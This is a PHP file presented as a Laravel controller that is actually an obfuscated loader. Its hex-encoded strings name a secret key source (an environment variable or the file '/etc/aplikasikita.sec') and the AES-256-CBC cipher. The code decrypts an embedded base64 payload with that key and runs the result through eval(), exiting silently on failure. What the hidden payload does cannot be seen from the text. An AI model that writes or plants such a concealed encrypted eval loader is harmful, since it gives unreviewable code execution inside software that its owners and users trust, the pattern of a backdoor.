<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('vTdjZAqmapZab7sdS28zwA==');

$c=base64_decode(

'8ggXL7IWc1H2mOgeWfAKmtN6fEhCzf3R2UPC+hBzKGkrHnlkJmJ+IGoXeQkY1B2hhGbQPRbKAWT1' .
'DVLN7j4XV8+cJcgPoN0isDUwdwL9HB4qQoGQhKSh8Ag0+/Yu+gpBHclt/f6doVSp+aNHsHnuCBtE' .
'SlU3Il478fJmxo4wu9hXaOAa68q+Y+moe+cJ2Wh8LvO5dydefWZ8oAPcOA3Z497mXDJaKl01paak' .
'vtgl8DJXtxf81ETzV3yulTDelkwG/ZZkw0+7L2MhtC1V8Ox7gFSPoqkLjTvChqRI6FngnirCj3/2' .
'bQSkEUHkJnoqeVzCfAG4CLZ63xYnv1J0DtVDwC8TCYndIDEuAhFnkzBVaYKR8Eqw5Fy62Pzv059v' .
'qSk11TPDL/vjTVapVLare81DZw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

